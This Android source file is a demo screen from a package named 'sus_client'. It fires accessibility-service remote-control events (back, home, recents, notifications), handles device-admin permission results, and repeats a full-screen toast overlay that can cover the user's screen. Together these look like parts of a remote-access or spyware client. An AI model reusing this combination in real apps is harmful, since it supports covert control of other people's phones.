package com.android.sus_client.applaunchers;

import static com.android.sus_client.services.MyAccessibilityService.remoteControlEvent;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Toast;

import com.android.sus_client.R;
import com.android.sus_client.control.Const;
import com.android.sus_client.utils.Utils;


public class DemoActivity extends Activity implements View.OnClickListener {


    private Context context;

    public static void start(Context context) {
        Intent intent = new Intent(context, DemoActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.act_demo);
        context = this;

        findViewById(R.id.btn_back).setOnClickListener(this);
        findViewById(R.id.btn_home).setOnClickListener(this);
        findViewById(R.id.btn_recents).setOnClickListener(this);
        findViewById(R.id.btn_notifications).setOnClickListener(this);
        findViewById(R.id.btn_toast).setOnClickListener(this);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Utils.setStatusBarTranslucent(this, Color.TRANSPARENT);
    }

    /**
     * @Global_Events ->
     * back, home, notifications, recents
     * @Gesture_Events ->
     * tap
     * swipe
     * paste
     * key, Backspace | Delete | ArrowLeft | ArrowRight | Home | End
     */
    @SuppressLint("NonConstantResourceId")
    @Override
    public void onClick(View v) {
        //if (!DeviceAdminPolicies.checkAndEnableAdminApp(this, deviceAdminReceiver)) {
        //    return;
        //}
        switch (v.getId()) {
            case R.id.btn_back:
                remoteControlEvent(this, "back");
                break;
            case R.id.btn_home:
                remoteControlEvent(this, "home");
                break;
            case R.id.btn_recents:
                remoteControlEvent(this, "recents");
                break;
            case R.id.btn_notifications:
                remoteControlEvent(this, "notifications");
            case R.id.btn_toast:
                showToastOverlay(10);
                break;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == Const.DEVICE_ADMIN_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                // The user granted device admin permission.
                log("DeviceAdminPolicies: Permission granted");
            } else {
                // The user denied device admin permission.
                log("DeviceAdminPolicies: Permission denied");
            }
        }
    }

    private static void log(String msg) {
        Log.e("DemoActivity", msg);
    }

    public void showToastOverlay(final int count) {
        final View view = LayoutInflater.from(context).inflate(R.layout.overlay_toast, null);
        final Toast t = new Toast(context);
        t.setGravity(Gravity.FILL, 0, 0);
        t.setView(view);
        t.setDuration(Toast.LENGTH_SHORT);
        t.show();
        if (count > 0) view.postDelayed(() -> showToastOverlay(count - 1), 800);
    }

}